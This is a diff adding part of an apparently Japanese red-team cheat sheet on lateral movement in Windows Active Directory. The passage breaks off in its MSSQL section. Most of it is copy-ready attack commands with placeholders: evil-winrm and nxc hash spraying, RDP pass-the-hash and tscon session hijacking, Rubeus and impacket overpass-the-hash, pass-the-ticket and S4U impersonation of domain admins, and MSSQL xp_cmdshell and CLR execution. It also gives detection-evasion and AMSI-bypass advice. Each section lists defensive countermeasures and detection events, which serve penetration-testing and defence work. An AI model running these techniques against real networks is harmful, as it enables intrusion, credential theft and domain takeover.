+      <div class="note"><span class="lbl">note</span>DCOM object 経由の実行は<strong>子プロセスの親が特殊</strong>になる。MMC20 なら <code>mmc.exe</code>、ShellWindows なら <code>explorer.exe</code> や <code>dllhost.exe {GUID}</code>、WMI なら <code>wmiprvse.exe</code>。この parent-child 関係が blue team の主要 signature になっているため、DCOM object を選ぶときは「target で自然に動いていそうな親プロセス」を優先する(Excel が入っている環境なら Excel.Application 経由の DDE、admin workstation なら MMC20)。</div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li><strong>Sysmon EID 1</strong> で <code>parent=wmiprvse.exe|mmc.exe|dllhost.exe|explorer.exe</code> かつ <code>child=cmd.exe|powershell.exe</code> の rule を貼る。</li>
+          <li><strong>Microsoft-Windows-WMI-Activity/Operational EID 5857 / 5858 / 5859 / 5861</strong> — WMI ProviderStore の異常呼び出し、特に <code>__EventFilter</code> や <code>__EventConsumer</code> の作成は WMI Persistence の signature。</li>
+          <li><strong>DCOM を用途別に制限</strong>: <code>dcomcnfg</code> または GPO の <code>DCOM: Machine Access Restrictions</code> で MMC20 の remote launch を無効化。互換性影響が大きいので pilot 環境で先に検証。</li>
+          <li><strong>WMI namespace ACL</strong>: <code>root\cimv2</code> の <code>__ProviderRegistration</code> の SD を強化して Win32_Process.Create の remote 実行を Domain Admins のみに絞る。</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>DCOM は「service を作らない」ので EID 7045 検知を素通りするが、Sysmon EID 1 の parent 検査で捕まる。</li>
+          <li>WMI (Win32_Process.Create) と DCOM (MMC20/ShellWindows) は<strong>親プロセスが違う</strong>。同じ「WMI」でも Invoke-WmiMethod は DCOM、Invoke-CimMethod は WSMan と transport が違う。</li>
+          <li>単発コマンドは <code>impacket-wmiexec &lt;args&gt; '&lt;CMD&gt;'</code> の semi-interactive を張らない形が最も痕跡が少ない。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s04" class="reveal">
+      <h2><span class="num">04</span>WinRM / PowerShell Remoting<span class="jp">WinRM / PS リモーティング</span></h2>
+      <p>WinRM は 5985 (HTTP) / 5986 (HTTPS) の SOAP over WSMan。Kerberos が優先されるため NT hash 単体では通らない — <a href="#s01">s01</a> の OverPTH で TGT を作ってから使う。framework 経由は <a href="command-control.html#s10">command-control s10</a> の <code>jump-winrm</code>、こちらは native の PSSession / evil-winrm。</p>
+
+      <h3 id="evil-winrm">evil-winrm</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># NTLM (Negotiate) 経由 — target の WinRM が NTLM を許可している場合のみ</span>
+evil-winrm -i <span class="v">&lt;TARGET&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span>
+evil-winrm -i <span class="v">&lt;TARGET&gt;</span> -u <span class="v">&lt;USER&gt;</span> -p <span class="v">&lt;PW&gt;</span>
+
+<span class="c"># HTTPS (5986) — self-signed 証明書対応</span>
+evil-winrm -i <span class="v">&lt;TARGET&gt;</span> -u <span class="v">&lt;USER&gt;</span> -p <span class="v">&lt;PW&gt;</span> -S
+
+<span class="c"># Kerberos — 事前に KRB5CCNAME=&lt;ccache&gt; が必要、/etc/krb5.conf の realm 設定必須</span>
+evil-winrm -i <span class="v">&lt;TARGET_FQDN&gt;</span> -r <span class="v">&lt;DOMAIN&gt;</span>
+
+<span class="c"># ローカルスクリプト menu (Bypass-4MSI, Invoke-Binary, upload/download)</span>
+<span class="c"># evil-winrm shell の中で:</span>
+<span class="c">#   menu           -&gt; 内蔵コマンド一覧</span>
+<span class="c">#   upload &lt;src&gt; &lt;dst&gt;</span>
+<span class="c">#   Bypass-4MSI    -&gt; AMSI patch</span>
+<span class="c">#   Invoke-Binary &lt;path&gt;  -&gt; assembly の in-memory 実行</span></code></pre></div>
+
+      <h3 id="pssession">PowerShell Remoting (Enter-PSSession / Invoke-Command)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># 対話 session (単一 host)</span>
+<span class="k">$cred</span> = Get-Credential
+Enter-PSSession -ComputerName <span class="v">&lt;TARGET&gt;</span> -Credential <span class="k">$cred</span>
+
+<span class="c"># scriptblock を一発実行</span>
+Invoke-Command -ComputerName <span class="v">&lt;TARGET&gt;</span> -Credential <span class="k">$cred</span> -ScriptBlock { whoami; hostname }
+
+<span class="c"># 複数 host に並列で同じ ScriptBlock を撃つ</span>
+Invoke-Command -ComputerName @(<span class="s">'&lt;T1&gt;'</span>,<span class="s">'&lt;T2&gt;'</span>,<span class="s">'&lt;T3&gt;'</span>) -Credential <span class="k">$cred</span> -ScriptBlock { <span class="k">$env:COMPUTERNAME</span> }
+
+<span class="c"># session を張って再利用 (帯域と handshake を節約)</span>
+<span class="k">$s</span> = New-PSSession -ComputerName <span class="v">&lt;TARGET&gt;</span> -Credential <span class="k">$cred</span>
+Invoke-Command -Session <span class="k">$s</span> -ScriptBlock { Get-Process }
+Invoke-Command -Session <span class="k">$s</span> -ScriptBlock { Get-Service }
+Remove-PSSession <span class="k">$s</span>
+
+<span class="c"># -Authentication Kerberos / Negotiate / CredSSP の切り替え</span>
+Invoke-Command -ComputerName <span class="v">&lt;TARGET_FQDN&gt;</span> -Authentication Kerberos -Credential <span class="k">$cred</span> -ScriptBlock { whoami }
+
+<span class="c"># WSMan の TrustedHosts 設定 (workgroup で NTLM を通したい)</span>
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value <span class="s">"&lt;TARGET&gt;"</span> -Force</code></pre></div>
+
+      <h3 id="nxc-winrm">nxc winrm module</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># NT hash spray (workgroup / non-domain で有効)</span>
+nxc winrm <span class="v">&lt;CIDR&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span>
+
+<span class="c"># 認証 OK な host に対して単発コマンド</span>
+nxc winrm <span class="v">&lt;TARGET&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span> -x <span class="s">'whoami /priv'</span>
+
+<span class="c"># AMSI bypass 込みで PowerShell を実行 (nxc の -X)</span>
+nxc winrm <span class="v">&lt;TARGET&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span> -X <span class="s">'&lt;PS_ONELINER&gt;'</span></code></pre></div>
+
+      <h3 id="jea-clm">JEA / CLM 制約下</h3>
+      <p>Just Enough Administration (JEA) 適用の session や Constrained Language Mode (CLM) 有効の Remoting endpoint では通常の .NET 呼び出しが弾かれる。実質許可コマンドの列挙:</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># CLM かどうかを確認</span>
+<span class="k">$ExecutionContext</span>.SessionState.LanguageMode
+<span class="c"># FullLanguage / ConstrainedLanguage / RestrictedLanguage</span>
+
+<span class="c"># JEA endpoint で「使える cmdlet」を列挙</span>
+Get-Command | Where-Object { <span class="k">$_</span>.Visibility -eq <span class="s">'Public'</span> }
+
+<span class="c"># CLM bypass は evasion sheet の CLM Bypass 節に本文がある — 実際の bypass 手順はそちら参照</span></code></pre></div>
+      <p>詳細な CLM bypass 手順は <a href="evasion.html#s02">evasion s02</a> を参照。ここでは「WinRM 経由の session が CLM だと通常の PTT / assembly load が失敗する」という制約の認識に留める。</p>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li><strong>WinRM を Kerberos-only 化</strong>: <code>winrm set winrm/config/service '@{AllowUnencrypted="false";Auth="@{Basic=&quot;false&quot;;Kerberos=&quot;true&quot;;Negotiate=&quot;false&quot;;Certificate=&quot;false&quot;;CredSSP=&quot;false&quot;}"}'</code>。NTLM を落とすと NT hash 単体の WinRM 直接注入を塞げる。</li>
+          <li><strong>JEA (Just Enough Administration)</strong>: 管理用アカウントの WinRM endpoint を特定 role capability に絞る。<code>New-PSRoleCapabilityFile</code> と <code>New-PSSessionConfigurationFile -SessionType RestrictedRemoteServer</code>。</li>
+          <li><strong>Microsoft-Windows-WinRM/Operational EID 91, 142</strong> — session create / connect の event を SIEM に送る。</li>
+          <li><strong>PowerShell logging</strong>: Module Logging + Script Block Logging を GPO で強制。<code>Microsoft-Windows-PowerShell/Operational EID 4104</code> は Invoke-Command 経由でも target 側に残る。</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>WinRM の第一問は「NTLM 許可か Kerberos-only か」。Kerberos-only なら NT hash のまま WinRM は通らず、必ず <a href="#s01">s01</a> の OverPTH で TGT を作る必要がある。</li>
+          <li>New-PSSession → Invoke-Command -Session の再利用パターンは、handshake の trace を減らせる。特に複数コマンドを叩くときに有効。</li>
+          <li>JEA / CLM の endpoint は「PowerShell の見た目をしていても実質別 shell」。従来手法が通らないので、まず LanguageMode と Get-Command の visibility を確認。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s05" class="reveal">
+      <h2><span class="num">05</span>RDP Lateral<span class="jp">RDP による横展開</span></h2>
+      <p>Interactive lateral の代表。Restricted Admin mode を使うと NT hash のまま RDP が通り、Session Hijack を使うと SYSTEM 権限で他ユーザの生 session を奪える。</p>
+
+      <h3 id="rdp-basic">通常の interactive RDP</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Kali 側から (freerdp3-x11)</span>
+xfreerdp3 /u:<span class="v">&lt;USER&gt;</span> /d:<span class="v">&lt;DOMAIN&gt;</span> /p:<span class="v">&lt;PW&gt;</span> /v:<span class="v">&lt;TARGET&gt;</span> +clipboard /size:1600x1000
+
+<span class="c"># ドライブ共有 (Kali の /tmp を RDP 経由でマウント)</span>
+xfreerdp3 /u:<span class="v">&lt;USER&gt;</span> /p:<span class="v">&lt;PW&gt;</span> /v:<span class="v">&lt;TARGET&gt;</span> /drive:share,/tmp
+
+<span class="c"># 証明書エラー無視 (self-signed の内部 CA 環境)</span>
+xfreerdp3 /u:<span class="v">&lt;USER&gt;</span> /p:<span class="v">&lt;PW&gt;</span> /v:<span class="v">&lt;TARGET&gt;</span> /cert:ignore</code></pre></div>
+
+      <h3 id="rdp-pth">Restricted Admin (Pass-the-Hash via RDP)</h3>
+      <p>NT hash のまま RDP を通すには target 側 registry の <code>DisableRestrictedAdmin = 0</code> が必要。default で無効な環境が多いため、事前に有効化しておく必要がある(=target 側で先に SMB 経由の command 実行が必要 → 鶏卵問題)。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># target 側で Restricted Admin を許可 (要 admin)</span>
+reg add <span class="s">"HKLM\System\CurrentControlSet\Control\Lsa"</span> /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
+
+<span class="c"># nxc smb 経由で先に registry を書いておく</span>
+nxc smb <span class="v">&lt;TARGET&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span> -x <span class="s">'reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'</span></code></pre></div>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Kali から NT hash で RDP</span>
+xfreerdp3 /u:<span class="v">&lt;USER&gt;</span> /d:<span class="v">&lt;DOMAIN&gt;</span> /pth:<span class="v">&lt;NT&gt;</span> /v:<span class="v">&lt;TARGET&gt;</span> /cert:ignore /size:1600x1000</code></pre></div>
+
+      <h3 id="rdp-hijack">RDP Session Hijack (tscon)</h3>
+      <p>SYSTEM 権限で <code>tscon</code> を呼ぶと、認証なしで他ユーザの生 session を自 session に接続できる。password / hash 不要で、他ユーザの<strong>すでに開いた authenticated session</strong> をそのまま乗っ取れる。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># 現在の session 一覧 (target 上で)</span>
+query user
+<span class="c">#   USERNAME  SESSIONNAME  ID  STATE   IDLE TIME  LOGON TIME</span>
+<span class="c">#   alice     rdp-tcp#3    2   Disc    12:45      2026-07-10 09:00</span>
+<span class="c">#   bob                    3   Active  .          2026-07-11 08:12</span>
+
+<span class="c"># admin から直接 tscon は認証を要求される → SYSTEM に昇格が必要</span>
+
+<span class="c"># SYSTEM 昇格の常套手段: service 経由で tscon を呼ぶ</span>
+sc create sesshijack binPath= <span class="s">"cmd.exe /k tscon 2 /dest:rdp-tcp#4"</span>
+sc start sesshijack
+<span class="c">#   -&gt; session ID 2 (alice) が自 session (#4) に接続される、password 不要</span>
+
+<span class="c"># PsExec 経由の SYSTEM 昇格でも同じ</span>
+PsExec.exe -accepteula -s -i cmd.exe
+<span class="c">#   -&gt; SYSTEM shell 内で tscon 2 /dest:rdp-tcp#4</span></code></pre></div>
+
+      <div class="note"><span class="lbl">note</span>RDP Session Hijack は password / hash なしで DA session を奪取できる強力な pattern。Server 上で DA が RDP 接続したまま disconnect (log off せずに切断) している状況で成立する。Terminal Server / Session Host / Jump Box を経由する運用の組織で特に効く。</div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li><strong>Restricted Admin を default 無効</strong>のまま維持。有効化する場合は Server-side でも Client-side でも同時管理し、GPO で監視。</li>
+          <li><strong>Session Hijack 対策</strong>: GPO の <code>Set time limit for disconnected sessions</code> を 1〜5 分に設定して disconnected session を強制 logoff。</li>
+          <li><strong>EID 4778 / 4779</strong>(session reconnect / disconnect)を SIEM で拾う。特に <code>Session Name</code> と <code>Client Name</code> の乖離は hijack signature。</li>
+          <li><strong>Remote Credential Guard</strong> を使えば RDP 先で credential が LSASS に載らない — hijack しても後段の credential dumping が空振り。</li>
+          <li><strong>Privileged Access Workstation (PAW)</strong>: DA が触る Jump Box は SYSTEM 権限に到達できる local admin を最小限に絞る。</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>Restricted Admin は「NT hash で RDP が通る」ので便利だが、target 側 registry の事前設定が必要。事前設定に SMB 経由の command 実行を挟むので、そもそも SMB が通るなら RDP を使わない選択肢もある。</li>
+          <li>RDP Session Hijack は SYSTEM さえ取れれば認証情報ゼロで DA を奪える。Jump Box / Terminal Server 系の環境で最優先で試す。</li>
+          <li>4624 type 10 (RemoteInteractive) と 4779 (session disconnect) の pairing が blue team の主要 signature。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s06" class="reveal">
+      <h2><span class="num">06</span>Kerberos-abuse as Lateral Transport<span class="jp">Kerberos の lateral 用途</span></h2>
+      <p>Kerberos exploit 本体の理論と取得手順は <a href="ad-compromise.html#s2">ad-compromise s2</a>(Credential Access)。ここでは<strong>取得済み ticket を lateral の transport として使う</strong>手順に絞るが、実務での再現性を優先して OverPTH / PTT / S4U の完結手順を本 sheet 内でも詳細に載せる。</p>
+
+      <h3 id="overpth">OverPTH (Overpass-the-Hash) 完結手順</h3>
+      <p>NT hash / AES key から TGT を作り、以降の全 Kerberos service (SMB / WinRM / RDP / MSSQL / LDAP) に対して認証できる状態を作る。NTLM が禁止された環境で NT hash から lateral するときの第一手。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># [1] Rubeus で TGT を要求 → 現在の LUID に注入</span>
+Rubeus.exe asktgt /user:<span class="v">&lt;USER&gt;</span> /rc4:<span class="v">&lt;NT&gt;</span> /domain:<span class="v">&lt;DOMAIN&gt;</span> /dc:<span class="v">&lt;DC_FQDN&gt;</span> /ptt
+
+<span class="c"># [2] klist で確認</span>
+klist
+<span class="c">#   -&gt; Client: &lt;USER&gt; @ &lt;DOMAIN&gt; / Server: krbtgt/&lt;DOMAIN&gt;  が表示される</span>
+
+<span class="c"># [3] 以降 SMB / WinRM / DCOM が Kerberos で通る</span>
+dir \\<span class="v">&lt;TARGET_FQDN&gt;</span>\c$                                <span class="c"># SMB</span>
+Enter-PSSession -ComputerName <span class="v">&lt;TARGET_FQDN&gt;</span>       <span class="c"># WinRM</span>
+
+<span class="c"># [4] 現行 LUID を汚したくない場合は netonly で分離</span>
+Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
+<span class="c">#   出力の LUID を控える (例: 0x1a2b3c4d)</span>
+
+<span class="c"># [5] その LUID に対して asktgt (別 cmd window が別 identity で動く)</span>
+Rubeus.exe asktgt /user:<span class="v">&lt;USER&gt;</span> /rc4:<span class="v">&lt;NT&gt;</span> /domain:<span class="v">&lt;DOMAIN&gt;</span> /ptt /luid:0x1a2b3c4d</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux 側で OverPTH — impacket が直接 rc4 で asktgt を送る</span>
+impacket-getTGT <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span> -dc-ip <span class="v">&lt;DC_IP&gt;</span>
+<span class="k">export</span> KRB5CCNAME=<span class="v">&lt;USER&gt;</span>.ccache
+
+<span class="c"># /etc/krb5.conf に realm を設定しておく</span>
+<span class="c">#   [libdefaults]</span>
+<span class="c">#     default_realm = &lt;DOMAIN_UPPER&gt;</span>
+<span class="c">#   [realms]</span>
+<span class="c">#     &lt;DOMAIN_UPPER&gt; = { kdc = &lt;DC_FQDN&gt; }</span>
+<span class="c">#   [domain_realm]</span>
+<span class="c">#     .&lt;domain_lower&gt; = &lt;DOMAIN_UPPER&gt;</span>
+
+<span class="c"># -k -no-pass で lateral 一発</span>
+impacket-psexec -k -no-pass <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET_FQDN&gt;</span>
+impacket-wmiexec -k -no-pass <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET_FQDN&gt;</span>
+evil-winrm -i <span class="v">&lt;TARGET_FQDN&gt;</span> -r <span class="v">&lt;DOMAIN_UPPER&gt;</span></code></pre></div>
+
+      <h3 id="ptt-detail">Pass-the-Ticket 完結手順</h3>
+      <p>既に別ホストで抽出した TGT (.kirbi / ccache) を、別の operator 環境に注入して継続 lateral する。credential dumping や Kerberoast の後段で頻用。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># [1] 前段で取得した TGT ファイル or B64 を用意</span>
+<span class="c">#     - mimikatz sekurlsa::tickets /export で抽出した *.kirbi</span>
+<span class="c">#     - Rubeus dump /nowrap で抽出した B64 文字列</span>
+<span class="c">#     - Linux 側の .ccache は ticketConverter で .kirbi に変換 (s01 参照)</span>
+
+<span class="c"># [2] PTT — ファイル指定</span>
+Rubeus.exe ptt /ticket:C:\Users\Public\ticket.kirbi
+
+<span class="c"># [3] PTT — B64 直指定 (file drop なしで完結)</span>
+Rubeus.exe ptt /ticket:doIFuDCCBbSgAwIB...(長い B64)...
+
+<span class="c"># [4] 特定 LUID への注入 (別 identity として保持)</span>
+Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
+Rubeus.exe ptt /ticket:<span class="v">&lt;B64&gt;</span> /luid:<span class="v">&lt;NEW_LUID&gt;</span>
+
+<span class="c"># [5] mimikatz 経由の PTT (Rubeus が blocked な環境の代替)</span>
+<span class="c"># mimikatz # kerberos::ptt C:\Users\Public\ticket.kirbi</span></code></pre></div>
+
+      <div class="note"><span class="lbl">note</span>PTT した ticket の有効期限は元 TGT の <code>endtime</code> に依存。<code>Rubeus describe /ticket:&lt;B64&gt;</code> で残り時間を確認してから lateral 作業に入る。Golden Ticket でない限り既定 10 時間、Protected Users 対象なら 4 時間。</div>
+
+      <h3 id="ptt-linux">Linux 側 PTT (ccache 注入)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ccache は KRB5CCNAME で切り替えるだけ、注入という概念がない</span>
+<span class="k">export</span> KRB5CCNAME=/tmp/ticket.ccache
+klist                                       <span class="c"># 確認</span>
+
+<span class="c"># kirbi しか手元にないなら ccache に変換してから</span>
+impacket-ticketConverter ticket.kirbi ticket.ccache
+<span class="k">export</span> KRB5CCNAME=ticket.ccache
+
+<span class="c"># /etc/krb5.conf の realm 設定が正しく効いていれば -k -no-pass で通る</span>
+impacket-psexec -k -no-pass <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET_FQDN&gt;</span></code></pre></div>
+
+      <h3 id="s4u-lateral">S4U (Constrained Delegation) 経由の lateral</h3>
+      <p>Constrained Delegation を許可された service account の credential を持っているとき、任意ユーザ (DA 含む) の TGS を発行して lateral できる。ad-compromise s2 の delegation 節が本文だが、<strong>lateral 経路として使う</strong> 手順を完結させておく。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># [1] Constrained Delegation を許可された account を特定 (PowerView)</span>
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+
+<span class="c"># [2] その account (例: svc_web$, delegated to cifs/&lt;TARGET&gt;) の hash / AES があると仮定</span>
+
+<span class="c"># [3] S4U で任意ユーザの TGS を発行 (DA を impersonate、TARGET の SMB 用)</span>
+Rubeus.exe s4u /user:svc_web$ /rc4:<span class="v">&lt;NT&gt;</span> /impersonateuser:<span class="v">&lt;DA_USER&gt;</span> /msdsspn:cifs/<span class="v">&lt;TARGET_FQDN&gt;</span> /ptt
+
+<span class="c"># [4] 以降 &lt;TARGET&gt; の SMB が DA 権限で通る</span>
+dir \\<span class="v">&lt;TARGET_FQDN&gt;</span>\c$
+
+<span class="c"># [5] altservice trick — msds-spn に指定した SPN を LDAP / HOST 等に読み替え</span>
+<span class="c">#     (Kerberos は SPN の service class 部分だけを見るので複数用途に転用可能)</span>
+Rubeus.exe s4u /user:svc_web$ /rc4:<span class="v">&lt;NT&gt;</span> /impersonateuser:<span class="v">&lt;DA_USER&gt;</span> /msdsspn:cifs/<span class="v">&lt;TARGET_FQDN&gt;</span> /altservice:host,http,ldap /ptt
+
+<span class="c"># [6] Linux 側 (impacket-getST)</span>
+impacket-getST -spn cifs/<span class="v">&lt;TARGET_FQDN&gt;</span> -impersonate <span class="v">&lt;DA_USER&gt;</span> <span class="v">&lt;DOMAIN&gt;</span>/svc_web\$ -hashes :<span class="v">&lt;NT&gt;</span>
+<span class="k">export</span> KRB5CCNAME=<span class="v">&lt;DA_USER&gt;</span>@cifs_<span class="v">&lt;TARGET_FQDN&gt;</span>@<span class="v">&lt;DOMAIN&gt;</span>.ccache
+impacket-psexec -k -no-pass <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;DA_USER&gt;</span>@<span class="v">&lt;TARGET_FQDN&gt;</span></code></pre></div>
+
+      <h3 id="tgtdeleg">TGTDeleg (自 session の delegate TGT 抽出)</h3>
+      <p>自分が動いている session の中で、他ホストに forward できる delegate TGT を抜き取る。Unconstrained Delegation を持つ host に coerce authentication (PetitPotam / SpoolSample) を仕掛けた後の credential 収集にも同じ機能。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># 現在の LUID の TGT (delegatable) を抽出</span>
+Rubeus.exe tgtdeleg /nowrap
+<span class="c">#   -&gt; B64 出力される、これを PTT すれば別 session で同じ identity で振る舞える</span>
+
+<span class="c"># 続けて他ホストに PTT で持ち込む</span>
+Rubeus.exe ptt /ticket:<span class="v">&lt;B64&gt;</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li><strong>Constrained Delegation は Kerberos-only 化</strong> (Use Kerberos only) にして、任意 protocol transition の delegation を禁止する。RBCD 側の許可管理も同時に。</li>
+          <li><strong>EID 4769</strong>(Kerberos service ticket request)を全 DC で有効化、特に <code>Ticket Options: 0x40810000</code> (forwardable + renewable + preauth) と、S4U proxy request signature (<code>Options 0x8</code>) を SIEM で拾う。</li>
+          <li><strong>EID 4624 type 3 with LogonProcessName=Kerberos</strong> の source workstation が「本来ログインしないユーザからのアクセス」パターンを検出。</li>
+          <li><strong>Protected Users</strong> と <strong>Account is sensitive and cannot be delegated</strong> を DA / high-value account に必ず設定。Delegation の対象から外れ、Golden / S4U 全般が塞がる。</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>OverPTH は「NTLM 禁止 & NT hash 所持」の交点で必ず必要。SMB signing / WinRM Kerberos-only 環境で第一手。</li>
+          <li>PTT は <code>createnetonly + /luid</code> の組み合わせで operator 側の LUID を汚さない運用が基本。事故 (mimikatz の <code>list</code> で ticket が見える) を防げる。</li>
+          <li>S4U は <code>/altservice</code> で SPN を横展開できる — 一度取れば cifs / host / http / ldap を全部使える。</li>
+          <li>EID 4769 と 4624 の pair は最も強力な blue team signature。lateral の頻度を落として rate anomaly に埋もれない運用を意識する。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s07" class="reveal">
+      <h2><span class="num">07</span>MSSQL Lateral<span class="jp">MSSQL 経由の横展開</span></h2>
+      <p>SQL Server は Windows 統合認証で動いており、Service Account の権限を直接 shell 実行に翻訳できる。特に <strong>linked server の chain</strong> は BloodHound の attack path に載らないため見落としがち。</p>
+
+      <h3 id="mssql-discovery">Discovery</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div><pre><code><span class="c"># PowerUpSQL - domain 内の SQL instance を SPN から一覧</span>
+Import-Module .\PowerUpSQL.ps1
+Get-SQLInstanceDomain
+Get-SQLInstanceDomain | Get-SQLServerInfo
+Get-SQLInstanceDomain | Get-SQLConnectionTest                <span class="c"># 現行 context で認証成功する instance を絞り込み</span>
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10</code></pre></div>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># nxc mssql — 大量の instance に対する authn spray</span>
+nxc mssql <span class="v">&lt;CIDR&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span>
+nxc mssql <span class="v">&lt;CIDR&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span> --local-auth
+
+<span class="c"># 接続確立できた instance の情報収集</span>
+nxc mssql <span class="v">&lt;TARGET&gt;</span> -u <span class="v">&lt;USER&gt;</span> -H <span class="v">&lt;NT&gt;</span> -q <span class="s">"SELECT @@version"</span></code></pre></div>
+
+      <h3 id="mssql-exec">Direct execution</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># impacket-mssqlclient - interactive SQL shell</span>
+impacket-mssqlclient <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -hashes :<span class="v">&lt;NT&gt;</span> -windows-auth
+impacket-mssqlclient <span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>@<span class="v">&lt;TARGET&gt;</span> -k -no-pass -windows-auth       <span class="c"># Kerberos</span></code></pre></div>
+      <div class="code"><div class="code-bar"><span class="code-lang">sql</span><button class="copy">copy</button></div><pre><code><span class="c">-- xp_cmdshell 有効化 → コマンド実行</span>
+EXEC sp_configure <span class="s">'show advanced options'</span>, 1; RECONFIGURE;
+EXEC sp_configure <span class="s">'xp_cmdshell'</span>, 1; RECONFIGURE;
+EXEC xp_cmdshell <span class="s">'whoami /all'</span>;
+EXEC xp_cmdshell <span class="s">'powershell -c "&lt;PS_CMD&gt;"'</span>;
+
+<span class="c">-- sp_OACreate 経由 (xp_cmdshell が塞がれているとき)</span>
+DECLARE @shell INT;
+EXEC sp_OACreate <span class="s">'WScript.Shell'</span>, @shell OUT;
+EXEC sp_OAMethod @shell, <span class="s">'Run'</span>, NULL, <span class="s">'cmd.exe /c &lt;CMD&gt;'</span>, 0, true;
+
+<span class="c">-- CLR assembly load (最も検知されにくい)</span>
+EXEC sp_configure <span class="s">'clr enabled'</span>, 1; RECONFIGURE;
+EXEC sp_configure <span class="s">'clr strict security'</span>, 0; RECONFIGURE;
+CREATE ASSEMBLY [ClrShell] FROM <span class="s">'0x&lt;HEX_ASSEMBLY&gt;'</span> WITH PERMISSION_SET = UNSAFE;
+CREATE PROCEDURE dbo.clr_exec (@cmd NVARCHAR(MAX)) AS EXTERNAL NAME [ClrShell].[ClrShell].Run;
+EXEC dbo.clr_exec <span class="s">'whoami'</span>;</code></pre></div>
+
+      <h3 id="linked-server">Linked server chain</h3>
+      <p>SQL Server は他の SQL Server に対して <strong>linked server</strong> を張れる。linked server の認証 context は元 server の service account に固定される — つまり linked server を hop するたびに <strong>認証情報が自動継承</strong> される。入口の credential では届かない下流 DB が、chain の末端では管理者権限で叩けるケースが頻出。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">sql</span><button class="copy">copy</button></div><pre><code><span class="c">-- 現在の instance の linked server を列挙</span>
+SELECT * FROM sys.servers WHERE is_linked = 1;
+
+<span class="c">-- linked server 越しに query (single hop)</span>
+SELECT * FROM OPENQUERY([<span class="v">&lt;LINKED&gt;</span>], <span class="s">'SELECT SYSTEM_USER, @@version'</span>);
+
+<span class="c">-- linked server 上で xp_cmdshell (rpc out 有効前提)</span>
